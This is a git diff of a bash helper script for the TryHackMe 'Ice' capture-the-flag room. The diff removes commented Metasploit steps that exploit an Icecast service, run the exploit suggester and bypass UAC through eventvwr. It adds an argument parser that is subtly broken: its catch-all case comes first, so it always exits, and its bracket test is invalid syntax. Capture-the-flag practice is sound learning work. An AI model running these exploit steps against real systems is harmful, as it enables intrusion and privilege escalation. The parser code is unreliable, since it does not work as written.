@@ -2,31 +2,43 @@
 
 # | ice - TryHackMe
 # | Link: https://tryhackme.com/r/room/ice
-# | Cya-nyde
+# | by Cya-nyde
 
-targetip=$tIp
-vpnip=$lIp
-targetPort=$tPort
+help(){
+    echo "Use -t to specify target and -p to specify port"
+    echo "Use the -h flag to display this help menu"
+}
 
-sudo nmap -sV -vv $targetip
+#retrieve ip and port flags
+while getopts ht:p: flag
+do
+    case "$flag" in
+        *)
+            help
+            exit 0
+            ;;
+        h)
+            help
+            exit 0
+            ;;
+        t)
+            ip=$OPTARG
+            ;;
+        p)
+            port=$OPTARG
+            ;;
+        \?)
+            help
+            exit 1
+            ;;
+    esac
+done
 
-#Icecast on port 8000
+ if [ -z "$ip" || -z "$port" ]
+ then
+  help
+  exit 1
+ fi
 
-#METASPLOIT
-#msfconsole
-#search icecast
-#use 0
-#set RHOSTS $targetip
-#set LHOST $vpnip
-#run
-
-#ctrl + z
-#search suggester
-#use 0
-#set Session 1
-#run
-
-#use exploit/windows/local/bypassuac_eventvwr
-#set session 1
-#set lhost !vpnip
-#run
+echo "$ip"
+echo "$port"
